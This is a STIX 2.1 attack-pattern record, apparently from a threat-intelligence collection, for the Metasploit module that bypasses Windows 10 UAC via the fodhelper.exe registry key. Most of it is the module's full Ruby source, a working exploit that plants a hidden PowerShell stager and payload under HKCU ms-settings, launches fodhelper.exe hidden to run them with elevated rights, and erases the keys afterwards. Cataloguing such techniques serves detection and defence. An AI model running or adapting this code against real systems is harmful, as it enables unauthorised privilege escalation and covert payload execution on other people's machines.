{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14b1d5d7-023c-4ce4-a782-519e7b137d39",
    "created": "2024-08-14T16:50:08.724673Z",
    "modified": "2024-08-14T16:50:08.724677Z",
    "name": "Windows UAC Protection Bypass (Via FodHelper Registry Key)",
    "description": " This module will bypass Windows 10 UAC by hijacking a special key in the Registry under the current user hive, and inserting a custom command that will get invoked when the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC flag turned off.  This module modifies a registry key, but cleans up the key once the payload has been invoked.  The module does not require the architecture of the payload to match the OS. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_fodhelper.rb",
            "external_id": "bypassuac_fodhelper.rb"
        },
        {
            "source_name": "reference",
            "url": "https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1"
        },
        {
            "source_name": "reference",
            "url": "https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Exploit::Powershell\n  include Post::Windows::Priv\n  include Post::Windows::Registry\n  include Post::Windows::Runas\n\n  FODHELPER_DEL_KEY = 'HKCU\\\\Software\\\\Classes\\\\ms-settings'.freeze\n  FODHELPER_WRITE_KEY = 'HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command'.freeze\n  EXEC_REG_DELEGATE_VAL = 'DelegateExecute'.freeze\n  EXEC_REG_VAL = ''.freeze # This maps to \"(Default)\"\n  EXEC_REG_VAL_TYPE = 'REG_SZ'.freeze\n  FODHELPER_PATH = '%WINDIR%\\\\System32\\\\fodhelper.exe'.freeze\n  CMD_MAX_LEN = 16383\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows UAC Protection Bypass (Via FodHelper Registry Key)',\n        'Description' => %q{\n          This module will bypass Windows 10 UAC by hijacking a special key in the Registry under\n          the current user hive, and inserting a custom command that will get invoked when\n          the Windows fodhelper.exe application is launched. It will spawn a second shell that has the UAC\n          flag turned off.\n\n          This module modifies a registry key, but cleans up the key once the payload has\n          been invoked.\n\n          The module does not require the architecture of the payload to match the OS. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting your\n          payload in a separate process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'winscriptingblog', # UAC bypass discovery and research\n          'amaloteaux', # MSF module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/'],\n          ['URL', 'https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1'],\n          ['URL', 'https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/']\n        ],\n        'DisclosureDate' => '2017-05-12',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    version = get_version_info\n    if version.build_number >= Msf::WindowsVersion::Win10_InitialRelease && !version.windows_server? && is_uac_enabled?\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    commspec = '%COMSPEC%'\n    registry_view = REGISTRY_VIEW_NATIVE\n    psh_path = '%WINDIR%\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe'\n\n    # Make sure we have a sane payload configuration\n    if sysinfo['Architecture'] == ARCH_X64\n      if session.arch == ARCH_X86\n        # fodhelper.exe is x64 only exe\n        commspec = '%WINDIR%\\\\Sysnative\\\\cmd.exe'\n        if target_arch.first == ARCH_X64\n          # We can't use absolute path here as\n          # %WINDIR%\\\\System32 is always converted into %WINDIR%\\\\SysWOW64 from a x86 session\n          psh_path = 'powershell.exe'\n        end\n      end\n      if target_arch.first == ARCH_X86\n        # Invoking x86, so switch to SysWOW64\n        psh_path = '%WINDIR%\\\\SysWOW64\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe'\n      end\n    elsif target_arch.first == ARCH_X64\n      # if we're on x86, we can't handle x64 payloads\n      fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')\n    end\n\n    if !payload.arch.empty? && (payload.arch.first != target_arch.first)\n      fail_with(Failure::BadConfig, 'payload and target should use the same architecture')\n    end\n\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    check_permissions!\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n      UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    payload_value = rand_text_alpha(8)\n    psh_path = expand_path(psh_path)\n\n    template_path = Rex::Powershell::Templates::TEMPLATE_DIR\n    psh_payload = Rex::Powershell::Payload.to_win32pe_psh_net(template_path, payload.encoded)\n\n    if psh_payload.length > CMD_MAX_LEN\n      fail_with(Failure::None, \"Payload size should be smaller then #{CMD_MAX_LEN} (actual size: #{psh_payload.length})\")\n    end\n\n    psh_stager = \"\\\"IEX (Get-ItemProperty -Path #{FODHELPER_WRITE_KEY.gsub('HKCU', 'HKCU:')} -Name #{payload_value}).#{payload_value}\\\"\"\n    cmd = \"#{psh_path} -nop -w hidden -c #{psh_stager}\"\n\n    existing = registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, registry_view) || ''\n    exist_delegate = !registry_getvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view).nil?\n\n    if existing.empty?\n      registry_createkey(FODHELPER_WRITE_KEY, registry_view)\n    end\n\n    print_status('Configuring payload and stager registry keys ...')\n    unless exist_delegate\n      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, '', EXEC_REG_VAL_TYPE, registry_view)\n    end\n\n    registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, cmd, EXEC_REG_VAL_TYPE, registry_view)\n    registry_setvaldata(FODHELPER_WRITE_KEY, payload_value, psh_payload, EXEC_REG_VAL_TYPE, registry_view)\n\n    # Calling fodhelper.exe through cmd.exe allow us to launch it from either x86 or x64 session arch.\n    cmd_path = expand_path(commspec)\n    cmd_args = expand_path(\"/c #{FODHELPER_PATH}\")\n    print_status(\"Executing payload: #{cmd_path} #{cmd_args}\")\n\n    # We can't use cmd_exec here because it blocks, waiting for a result.\n    client.sys.process.execute(cmd_path, cmd_args, { 'Hidden' => true })\n\n    # Wait a copule of seconds to give the payload a chance to fire before cleaning up\n    # TODO: fix this up to use something smarter than a timeout?\n    Rex.sleep(5)\n\n    handler(client)\n\n    print_status('Cleaining up registry keys ...')\n    unless exist_delegate\n      registry_deleteval(FODHELPER_WRITE_KEY, EXEC_REG_DELEGATE_VAL, registry_view)\n    end\n    if existing.empty?\n      registry_deletekey(FODHELPER_DEL_KEY, registry_view)\n    else\n      registry_setvaldata(FODHELPER_WRITE_KEY, EXEC_REG_VAL, existing, EXEC_REG_VAL_TYPE, registry_view)\n    end\n    registry_deleteval(FODHELPER_WRITE_KEY, payload_value, registry_view)\n  end\n\n  def check_permissions!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    unless check == Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n\n    unless is_in_admin_group?\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    print_status('UAC is Enabled, checking level...')\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-12",
    "x_mitre_platforms": [
        "['win']"
    ]
}